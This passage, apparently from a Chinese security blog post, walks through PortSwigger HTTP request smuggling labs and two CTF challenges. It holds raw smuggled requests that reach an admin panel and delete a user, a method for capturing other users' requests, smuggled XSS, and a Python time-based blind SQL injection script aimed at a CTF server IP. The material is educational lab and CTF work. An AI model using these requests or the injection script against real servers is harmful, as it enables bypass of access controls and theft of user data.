class="bash">x=  </span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"></span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>简言之，由于第二个请求的<code>Host header</code>与第一个请求中走私请求的<code>Host header</code>冲突，请求被阻止。</p>
+<p>因此构造以上请求，在发送两次请求的时候，可将第二个请求http数据包附加到走私请求主体中，拼接在x=之后，成为一个请求。</p>
+<p>最后构造删除请求即可</p>
+<img src="//songxpu.github.io/2019/11/24/HTTP走私攻击/7.png">
+
+<p>当然这里可以不采用以上方法，多次发送请求仍有概率成功，但成功率无法保证</p>
+<img src="//songxpu.github.io/2019/11/24/HTTP走私攻击/6.png">
+
+<h4 id="TE-CL绕过前端服务器安全控制"><a href="#TE-CL绕过前端服务器安全控制" class="headerlink" title="TE-CL绕过前端服务器安全控制"></a>TE-CL绕过前端服务器安全控制</h4><p>同上面实验相反，前端服务器识别<code>Transfer-Encoding</code>，后端服务器识别<code>Content-Length</code></p>
+<p><strong>实验地址</strong>：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl</a></p>
+<p><strong>实验描述</strong></p>
+<p>本实验包含一个前端和后端服务器，后端服务器不支持<code>Transfer-Encoding</code>分块传输。现有一个管理员面板/admin，但被限制直接访问。</p>
+<p>要完成本实验，需向后端服务器走私一个http请求以访问到管理员系统并删除名为<code>carlos</code>的用户。</p>
+<p><strong>实验过程</strong></p>
+<p>构造走私请求，这里构造请求同上面实验有些差别</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST <span class="regexp">/ HTTP/</span><span class="number">1.1</span></span><br><span class="line"><span class="string">Host:</span> acc11f291f28854680882dae00df00bf.web-security-academy.net</span><br><span class="line"><span class="string">Connection:</span> close</span><br><span class="line">Cache-<span class="string">Control:</span> max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-<span class="string">Requests:</span> <span class="number">1</span></span><br><span class="line">User-<span class="string">Agent:</span> Mozilla<span class="regexp">/5.0 (Windows NT 10.0; WOW64) AppleWebKit/</span><span class="number">537.36</span> (KHTML, like Gecko) Chrome<span class="regexp">/75.0.3770.80 Safari/</span><span class="number">537.36</span></span><br><span class="line"><span class="string">Accept:</span> text<span class="regexp">/html,application/</span>xhtml+xml,application<span class="regexp">/xml;q=0.9,image/</span>webp,image<span class="regexp">/apng,*/</span>*;q=<span class="number">0.8</span>,application/signed-exchange;v=b3</span><br><span class="line"><span class="string">Referer:</span> <span class="string">https:</span><span class="comment">//portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl</span></span><br><span class="line">Accept-<span class="string">Encoding:</span> gzip, deflate</span><br><span class="line">Accept-<span class="string">Language:</span> zh-CN,zh;q=<span class="number">0.9</span></span><br><span class="line"><span class="string">Cookie:</span> session=DHsv0QPpKqKpsxRdjanyv0OdA5CUY9cn</span><br><span class="line">Content-<span class="string">Length:</span> <span class="number">4</span></span><br><span class="line">Transfer-<span class="string">Encoding:</span> chunked</span><br><span class="line"></span><br><span class="line"><span class="number">60</span></span><br><span class="line">POST <span class="regexp">/admin HTTP/</span><span class="number">1.1</span></span><br><span class="line">Content-<span class="string">Type:</span> application/x-www-form-urlencoded</span><br><span class="line">Content-<span class="string">Length:</span> <span class="number">12</span></span><br><span class="line"></span><br><span class="line">x=<span class="number">1</span></span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<p>构造请求，提示需要添加<code>Host:localhost</code></p>
+<img src="//songxpu.github.io/2019/11/24/HTTP走私攻击/8.png">
+
+<p>如果对此处请求体构造有疑问可以查看chunk传输数据的格式</p>
+<blockquote>
+<p>chunk传输数据格式如下，其中size的值由16进制表示。</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;[<span class="string">chunk size</span>][<span class="symbol">\r\n</span>][<span class="string">chunk data</span>][<span class="symbol">\r\n</span>][<span class="string">chunk size</span>][<span class="symbol">\r\n</span>][<span class="string">chunk data</span>][<span class="symbol">\r\n</span>][<span class="string">chunk size = 0[\r\n</span>][<span class="symbol">\r\n</span>]]</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>因而这里60对应的十进制是：96。恰好等于60以下到0以上数据的长度（包括\r\n）</p>
+<p>此处需说明一点，请求包中chunk分块传输的数据库长度必须正确，同时走私请求中的Content-Length长度也需保证正确，否则会提示无法识别或非法请求。</p>
+<img src="//songxpu.github.io/2019/11/24/HTTP走私攻击/9.png" width="500">
+
+<p>添加<code>Host:localhost</code>并修改数据块长度后重新发包</p>
+<img src="//songxpu.github.io/2019/11/24/HTTP走私攻击/10.png">
+
+<p>修改走私请求为GET方式，多次发送最终成功删除用户。</p>
+<img src="//songxpu.github.io/2019/11/24/HTTP走私攻击/11.png">
+
+<h3 id="利用请求走私获取前端服务器重写请求字段"><a href="#利用请求走私获取前端服务器重写请求字段" class="headerlink" title="利用请求走私获取前端服务器重写请求字段"></a>利用请求走私获取前端服务器重写请求字段</h3><p>在这种网络环境下，前端代理服务器在接收到请求后不会直接将请求转发给后端服务器，而是先添加一些必要的字段然后转发给后端服务器。</p>
+<p>如果不能获取到前端代理服务器添加或重写的字段，那么我们走私的请求就无法被后端服务器处理。</p>
+<p>如何获取这些值，这里有一个简单的方法：</p>
+<ol>
+<li>找一个能够将请求参数的值输出到响应中的POST请求</li>
+<li>把该POST请求中，找到的这个特殊的参数放在消息的最后面</li>
+<li>然后走私这一个请求，然后直接发送一个普通的请求，前端服务器对这个请求重写的一些字段就会显示出来。</li>
+</ol>
+<p><strong>实验地址</strong>：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting</a></p>
+<p><strong>实验描述</strong>：</p>
+<p>本实验中前端服务器不支持分块编码，即CL-TE</p>
+<p>现有一个管理员面板/admin，但只有IP地址为127.0.0.1的用户才能访问。前端服务器将HTTP头添加到到包含其IP地址的传入请求中。类似于XXF头，但名称不一样。</p>
+<p>要完成本实验，需要向后端服务器走私一个请求，以显示前端服务器添加的HTTP头。然后再构造包含该HTTP头的走私请求，最终删除用户carlos。</p>
+<p><strong>实验过程</strong></p>
+<p>进入发现有一个搜索框</p>
+<img src="//songxpu.github.io/2019/11/24/HTTP走私攻击/1.jpg" width="500">
+
+<p>并且请求参数中的值能够输出到相应的POST请求中</p>
+<img src="//songxpu.github.io/2019/11/24/HTTP走私攻击/2.jpg" width>
+
+<p>构造一个走私请求数据包，多次发送在前端中显示了HTTP请求</p>
+<blockquote>
+<p>解释一下：走私请求数据包中Content-length: 80，显然自身携带数据没有达到这个数目。</p>
+<p>因而后端服务器会在收到第一个走私请求时会误以为该请求还没有结束，将不断接受新传来的HTTP请求直到长度达到80。</p>
+<p>因此添加在search=888后的HTTP请求也成POST请求的一部分，最终将前端服务器添加的HTTP头显示在页面</p>
+</blockquote>
+<img src="//songxpu.github.io/2019/11/24/HTTP走私攻击/3.jpg" width>
+
+<p>将获取的HTTP头添加到走私请求中，再次发送数据包</p>
+<img src="//songxpu.github.io/2019/11/24/HTTP走私攻击/4.jpg" width>
+
+<img src="//songxpu.github.io/2019/11/24/HTTP走私攻击/5.jpg" width>
+
+<p>最终成功删除用户</p>
+<img src="//songxpu.github.io/2019/11/24/HTTP走私攻击/6.jpg" width>
+
+<h3 id="利用请求走私捕获其他用户的请求"><a href="#利用请求走私捕获其他用户的请求" class="headerlink" title="利用请求走私捕获其他用户的请求"></a>利用请求走私捕获其他用户的请求</h3><p>在上一个实验中，我们通过走私一个不完整的请求来获取前端服务器添加的字段，而字段来自于我们后续发送的请求。换句话说，我们通过请求走私获取到了我们走私请求之后的请求。如果在我们的恶意请求之后，其他用户也进行了请求呢？我们寻找的这个POST请求会将获得的数据存储并展示出来呢？这样一来，我们可以走私一个恶意请求，将其他用户的请求的信息拼接到走私请求之后，并存储到网站中，我们再查看这些数据，就能获取用户的请求了。这可以用来偷取用户的敏感信息，比如账号密码等信息。</p>
+<p><strong>实验地址</strong>：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests</a></p>
+<p><strong>实验描述</strong>：</p>
+<p>本实验前端服务器不支持分块编码，即CL-TE</p>
+<p>完成本实验需将请求走私到后端服务器，该请求导致</p>
+<p><strong>实验过程</strong>：</p>
+<p>构造请求</p>
+<img src="//songxpu.github.io/2019/11/24/HTTP走私攻击/7.jpg" width>
+
+<p>走私请求中CL为800，其他用户的HTTP请求将会接在走私请求尾部。</p>
+<p>理论上实验中会有机器人定时发送请求，但这里等了很久没等到，只捕获自己的请求，但原理是一样的。</p>
+<img src="//songxpu.github.io/2019/11/24/HTTP走私攻击/8.jpg" width="600">
+
+<h3 id="利用请求走私传入XSS"><a href="#利用请求走私传入XSS" class="headerlink" title="利用请求走私传入XSS"></a>利用请求走私传入XSS</h3><p>通过HTTP请求走私搭配反射型XSS进行攻击，这样不需要与受害者交互即可发起攻击。</p>
+<p><strong>实验地址</strong>：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss</a></p>
+<p><strong>实验描述</strong>：</p>
+<p>CL-TE</p>
+<p>本实验可通过User-Agent传入XSS，通过将HTTP请求走私到后端服务器，该请求导致下一个用户的请求将接收到包含执行alert(1)的XSS漏洞响应。</p>
+<p><strong>实验过程</strong>：</p>
+<img src="//songxpu.github.io/2019/11/24/HTTP走私攻击/9.jpg" width>
+
+<p>其他用户如果在攻击者将请求走私到后端服务器之后访问该页面，将弹框</p>
+<img src="//songxpu.github.io/2019/11/24/HTTP走私攻击/10.jpg" width="500">
+
+<h2 id="CTF实践"><a href="#CTF实践" class="headerlink" title="CTF实践"></a>CTF实践</h2><h3 id="RoarCTF2019-EasyCal"><a href="#RoarCTF2019-EasyCal" class="headerlink" title="RoarCTF2019-EasyCal"></a>RoarCTF2019-EasyCal</h3><p><code>calc.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123; </span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">        $str = $_GET[<span class="string">'num'</span>]; </span><br><span class="line">        $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>,<span class="string">'\$'</span>,<span class="string">'\\'</span>,<span class="string">'\^'</span>]; </span><br><span class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123; </span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $str)) &#123; </span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>); </span><br><span class="line">                &#125; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'echo '</span>.$str.<span class="string">';'</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>其中除了对<code>$blacklist</code>中的字符进行过滤之外并没有对字符过滤，因此判断后端存在waf。</p>
+<p>这里有两种做法，一是利用http请求走私，二是利用PHP的解析特性，此处以请求走私为例：</p>
+<img src="//songxpu.github.io/2019/11/24/HTTP走私攻击/15.jpg" width>
+
+<p>中间代理服务器按第一个CL的值对请求处理，后端服务器对第二个CL的值进行处理，因而请求中若出现两个CL头，前后服务器都将各自执行一次。</p>
+<h3 id="EIS2019-ezwaf"><a href="#EIS2019-ezwaf" class="headerlink" title="EIS2019-ezwaf"></a>EIS2019-ezwaf</h3><p>直接给了源码，第32行明显存在数字型注入漏洞。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'src'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">($arr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $mysqli;</span><br><span class="line">    $newarr = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span>($arr <span class="keyword">as</span> $key=&gt;$val)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!is_array($val))</span><br><span class="line">        &#123;</span><br><span class="line">            $newarr[$key] = mysqli_real_escape_string($mysqli, $val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $newarr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_GET= escape($_GET);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $name = $_GET[<span class="string">'name'</span>];</span><br><span class="line">    mysqli_query($mysqli, <span class="string">"select age from user where name='$name'"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'age'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $age = $_GET[<span class="string">'age'</span>];</span><br><span class="line">    mysqli_query($mysqli, <span class="string">"select name from user where age=$age"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>传入<code>-1 or 1</code>，显示403（感觉403成CTF中HTTP请求走私的提示了）</p>
+<img src="//songxpu.github.io/2019/11/24/HTTP走私攻击/16.jpg" width>
+
+<p>添加两个Content-Length后提示400 Bad Request</p>
+<p>构造盲注发现SQL语句成功执行（and sleep(1)无法执行</p>
+<img src="//songxpu.github.io/2019/11/24/HTTP走私攻击/17.jpg" width>
+
+<p>由此可以编写脚本进行盲注</p>
+<blockquote>
+<p>这里有一个问题，header中无法传入两个Content-Length，只取第二个，因此使用CL:’’替代</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://111.186.57.43:10601/?age="</span></span><br><span class="line"><span class="comment">#exp1="1 or if(ascii(mid((select table_name from information_schema.tables where table_schema=database() limit 0,1),%d,1))=%s,sleep(5),1)"</span></span><br><span class="line"><span class="comment">#表名flag_xdd</span></span><br><span class="line"><span class="comment"># exp2="1 or if(ascii(mid((select group_concat(column_name) from information_schema.columns where table_name=0x666c61675f786464),%d,1))=%s,sleep(5),1)"</span></span><br><span class="line"><span class="comment">#列名：flag_32122</span></span><br><span class="line">exp3=<span class="string">"1 or if(ascii(mid((select flag_32122 from flag_xdd),%d,1))=%s,sleep(5),1)"</span></span><br><span class="line"></span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36'</span>,</span><br><span class="line">    <span class="string">'Content-Length'</span>: <span class="string">''</span></span><br><span class="line">&#125;</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> ascii <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">126</span>):</span><br><span class="line">        exp=exp3%(int(i),ascii)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># print(i,ascii)</span></span><br><span class="line">            <span class="comment"># print(url+urllib.parse.quote(exp))</span></span><br><span class="line">            requests.get(url+urllib.parse.quote(exp),headers=headers,timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            flag += chr(int(ascii))</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<img src="//songxpu.github.io/2019/11/24/HTTP走私攻击/18.jpg" width="400">
+
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://paper.seebug.org/1048" target="_blank" rel="noopener">协议层的攻击——HTTP请求走私</a></p>
+<p><a href="https://xz.aliyun.com/t/6631" target="_blank" rel="noopener">从一道题深入HTTP协议与HTTP请求走私</a></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        
+          
+        
+        <div class="post-tags">
+          
+            <a href="/tags/web安全/" rel="tag"># web安全</a>
+          
+            <a href="/tags/HTTP请求走私/" rel="tag"># HTTP请求走私</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/11/16/代码审计/Thinkphp3.2.3安全开发须知/" rel="next" title="ThinkPHP3.2.3安全开发须知">
+                <i class="fa fa-chevron-left"></i> ThinkPHP3.2.3安全开发须知
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Azeroth</p>
+              <div class="site-description motion-element" itemprop="description"></div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">26</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">4</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">15</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HTTP请求走私产生原因"><span class="nav-number">2.</span> <span class="nav-text">HTTP请求走私产生原因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#走私请求种类"><span class="nav-number">3.</span> <span class="nav-text">走私请求种类</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CL不为0的GET请求"><span class="nav-number">3.1.</span> <span class="nav-text">CL不为0的GET请求</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CL-CL"><span class="nav-number">3.2.</span> <span class="nav-text">CL-CL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CL-TE"><span class="nav-number">3.3.</span> <span class="nav-text">CL-TE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TE-CL"><span class="nav-number">3.4.</span> <span class="nav-text">TE-CL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TE-TE"><span class="nav-number">3.5.</span> <span class="nav-text">TE-TE</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#攻击实例"><span class="nav-number">4.</span> <span class="nav-text">攻击实例</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过前端服务器安全控制"><span class="nav-number">4.1.</span> <span class="nav-text">绕过前端服务器安全控制</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#CL-TE绕过前端服务器安全控制"><span class="nav-number">4.1.1.</span> <span class="nav-text">CL-TE绕过前端服务器安全控制</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#TE-CL绕过前端服务器安全控制"><span class="nav-number">4.1.2.</span> <span class="nav-text">TE-CL绕过前端服务器安全控制</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用请求走私获取前端服务器重写请求字段"><span class="nav-number">4.2.</span> <span class="nav-text">利用请求走私获取前端服务器重写请求字段</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用请求走私捕获其他用户的请求"><span class="nav-number">4.3.</span> <span class="nav-text">利用请求走私捕获其他用户的请求</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用请求走私传入XSS"><span class="nav-number">4.4.</span> <span class="nav-text">利用请求走私传入XSS</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CTF实践"><span class="nav-number">5.</span> <span class="nav-text">CTF实践</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#RoarCTF2019-EasyCal"><span class="nav-number">5.1.</span> <span class="nav-text">RoarCTF2019-EasyCal</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EIS2019-ezwaf"><span class="nav-number">5.2.</span> <span class="nav-text">EIS2019-ezwaf</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考文章"><span class="nav-number">6.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Azeroth</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">站点总字数：</span>
+    
+    <span title="站点总字数">129k</span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    
+    <span title="站点阅读时长">1:57</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.8.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.1.2</div>
+
+
+
+<span id="busuanzi_container_site_uv">
+  本站访问次数：<span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+</span>
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.2"></script>
+
+  <script src="/js/motion.js?v=7.1.2"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.1.2"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.1.2"></script>
+
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.2"></script>
+<script src="/js/post-details.js?v=7.1.2"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.2"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+
+  
+  <script>
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
